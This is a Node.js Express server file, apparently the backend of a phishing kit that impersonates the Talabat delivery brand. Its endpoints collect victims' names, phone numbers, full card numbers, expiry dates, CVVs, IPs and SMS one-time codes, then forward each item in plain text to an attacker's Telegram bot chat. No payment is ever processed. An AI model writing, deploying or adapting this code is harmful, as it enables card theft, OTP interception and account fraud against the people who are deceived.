const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const config = require('./config');

const app = express();

// Security middleware
app.use(helmet());
app.use(cors());

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Routes
app.get('/', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Talabat Server API is running',
        version: '1.0.0',
        timestamp: new Date().toISOString()
    });
});

// Payment API endpoint
app.post('/api/send-payment', async (req, res) => {
    try {
        const {
            firstName,
            lastName,
            phoneNumber,
            creditCard,
            expiryDate,
            expiryMonth,
            expiryYear,
            cvv,
            ip,
            timestamp
        } = req.body;
        
        // Validate required fields
        if (!firstName || !lastName || !phoneNumber || !creditCard || !expiryDate || !cvv) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields'
            });
        }
        
        // Format message for Telegram (same format as api/send-payment.js)
        const message = `💳 [Talabat Payment Data]

👤 First Name: ${firstName}
👤 Last Name: ${lastName}
📞 Phone: ${phoneNumber}
💳 Card Number: ${creditCard}
📅 Expiry: ${expiryDate} (${expiryMonth}/${expiryYear})
🔒 CVV: ${cvv}
🌐 IP: ${ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress}
⏰ Time: ${timestamp || new Date().toISOString()}

━━━━━━━━━━━━━━━━━━━━
© Talabat Server API`;

        // Send to Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
            {
                chat_id: config.telegram.chatId,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );
        
        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'Payment data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        } else {
            throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
        }
        
    } catch (error) {
        console.error('Error sending payment data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send payment data',
            error: error.message
        });
    }
});

// SMS API endpoint
app.post('/api/send-sms', async (req, res) => {
    try {
        const {
            otp,
            ip,
            timestamp
        } = req.body;
        
        // Validate required fields
        if (!otp) {
            return res.status(400).json({
                success: false,
                message: 'Missing OTP code'
            });
        }
        
        // Format message for Telegram (same format as api/send-sms.js)
        const message = `📱 [Talabat SMS/OTP Code]

🔢 OTP Code: ${otp}
🌐 IP: ${ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress}
⏰ Time: ${timestamp || new Date().toISOString()}

━━━━━━━━━━━━━━━━━━━━
© Talabat Server API`;

        // Send to Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
            {
                chat_id: config.telegram.chatId,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );
        
        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'SMS data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        } else {
            throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
        }
        
    } catch (error) {
        console.error('Error sending SMS data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send SMS data',
            error: error.message
        });
    }
});

// Approve API endpoint
app.post('/api/send-approve', async (req, res) => {
    try {
        const { 
            messages,
            pageType,
            clientIP
        } = req.body;

        // Validate required fields
       

  
        const message = `type (${pageType}):
me: ${messages}
🌐 IP: ${clientIP || req.ip}
⏰ Time: ${new Date().toLocaleString('he-IL')}`;

        // Send to Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
            {
                chat_id: config.telegram.chatId,
                text: message,
                parse_mode: 'HTML'
            }
        );

        if (telegramResponse.data.ok) {
            res.json({ 
                success: true, 
                message: 'Approve data sent successfully',
                messageId: telegramResponse.data.result.message_id
            });
        } else {
            throw new Error('Telegram API error');
        }

    } catch (error) {
        console.error('Error sending approve data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to send approve data' 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ 
        success: false, 
        message: 'Something went wrong!' 
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        message: 'Route not found' 
    });
});

// Start server
const PORT = config.server.port || process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Talabat Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot Token: ${config.telegram.botToken.substring(0, 10)}...`);
    console.log(`🌍 Environment: ${config.server.environment}`);
    console.log(`🔗 API Base URL: http://localhost:${PORT}`);
});

module.exports = app;
